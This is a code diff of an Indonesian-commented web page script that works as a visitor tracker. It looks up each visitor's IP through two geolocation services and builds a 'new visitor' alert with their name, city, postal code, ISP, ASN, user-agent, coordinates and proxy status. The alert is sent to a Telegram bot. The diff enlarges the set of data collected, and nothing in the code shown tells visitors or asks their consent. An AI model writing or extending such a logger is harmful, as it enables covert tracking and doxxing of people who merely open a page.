@@ -30,7 +30,7 @@
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
                     text: message,
-                    parse_mode: "Markdown"  // Supaya teks lebih rapi
+                    parse_mode: "Markdown"
                 })
             }).catch(error => console.error("Gagal mengirim ke Telegram:", error));
         }
@@ -43,36 +43,40 @@
                 let ipData = await ipResponse.json();
                 let userIP = ipData.ip;
 
-                // 2️⃣ Ambil informasi detail tentang IP
-                let locationResponse = await fetch(`https://freeipapi.com/api/json/${userIP}`);
-                let locationData = await locationResponse.json();
+                // 2️⃣ Ambil informasi detail dari freeipapi
+                let freeIpResponse = await fetch(`https://freeipapi.com/api/json/${userIP}`);
+                let freeIpData = await freeIpResponse.json();
 
-                // 3️⃣ Update iframe dengan koordinat pengguna
+                // 3️⃣ Ambil informasi tambahan dari ip-api
+                let ipApiResponse = await fetch(`http://ip-api.com/json/${userIP}`);
+                let ipApiData = await ipApiResponse.json();
+
+                // 4️⃣ Update Google Maps iframe sesuai koordinat pengguna
                 let mapIframe = document.getElementById("map-frame");
-                mapIframe.src = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}&output=embed`;
+                mapIframe.src = `https://www.google.com/maps?q=${freeIpData.latitude},${freeIpData.longitude}&output=embed`;
 
-                // 4️⃣ Siapkan pesan lengkap untuk dikirim ke Telegram
+                // 5️⃣ Format pesan lengkap untuk Telegram
                 let message = `🚨 *Pengunjung Baru!* 🚨\n\n` +
                               `👤 *Nama:* ${userName}\n` +
-                              `📍 *IP:* \`${locationData.ipAddress}\`\n` +
-                              `🌍 *Negara:* ${locationData.countryName} (${locationData.countryCode})\n` +
-                              `🏙 *Kota:* ${locationData.cityName}, ${locationData.regionName}\n` +
-                              `🌎 *Benua:* ${locationData.continent} (${locationData.continentCode})\n` +
-                              `📌 *Kode Pos:* ${locationData.zipCode}\n` +
-                              `🕒 *Zona Waktu:* ${locationData.timeZone}\n` +
-                              `💱 *Mata Uang:* ${locationData.currency.name} (${locationData.currency.code})\n` +
-                              `🗣 *Bahasa:* ${locationData.language}\n` +
-                              `📡 *ISP:* ${locationData.ispName || "Tidak diketahui"}\n` +
-                              `🌐 *TLD:* ${locationData.tlds.join(", ")}\n` +
+                              `📍 *IP:* \`${ipApiData.query}\`\n` +
+                              `🌍 *Negara:* ${ipApiData.country} (${ipApiData.countryCode})\n` +
+                              `🏙 *Kota:* ${ipApiData.city}, ${ipApiData.regionName}\n` +
+                              `🌎 *Benua:* ${freeIpData.continent} (${freeIpData.continentCode})\n` +
+                              `📌 *Kode Pos:* ${ipApiData.zip}\n` +
+                              `🕒 *Zona Waktu:* ${ipApiData.timezone}\n` +
+                              `💱 *Mata Uang:* ${freeIpData.currency.name} (${freeIpData.currency.code})\n` +
+                              `📡 *ISP:* ${ipApiData.isp || "Tidak diketahui"}\n` +
+                              `🏢 *ASN:* ${ipApiData.as || "Tidak diketahui"}\n` +
+                              `🌐 *Organisasi:* ${ipApiData.org || "Tidak diketahui"}\n` +
                               `🔍 *User-Agent:* \`${navigator.userAgent}\`\n\n` +
-                              `📌 *Koordinat:* ${locationData.latitude}, ${locationData.longitude}\n` +
-                              `🕹 *Proxy:* ${locationData.isProxy ? "Ya" : "Tidak"}`;
+                              `📌 *Koordinat:* ${ipApiData.lat}, ${ipApiData.lon}\n` +
+                              `🕹 *Proxy:* ${freeIpData.isProxy ? "Ya" : "Tidak"}`;
 
-                // 5️⃣ Kirim pesan ke Telegram
+                // 6️⃣ Kirim pesan ke Telegram
                 sendToTelegram(message);
 
             } catch (error) {
-                console.error("Gagal mendapatkan IP:", error);
+                console.error("Gagal mendapatkan data:", error);
             }
         }
     </script>
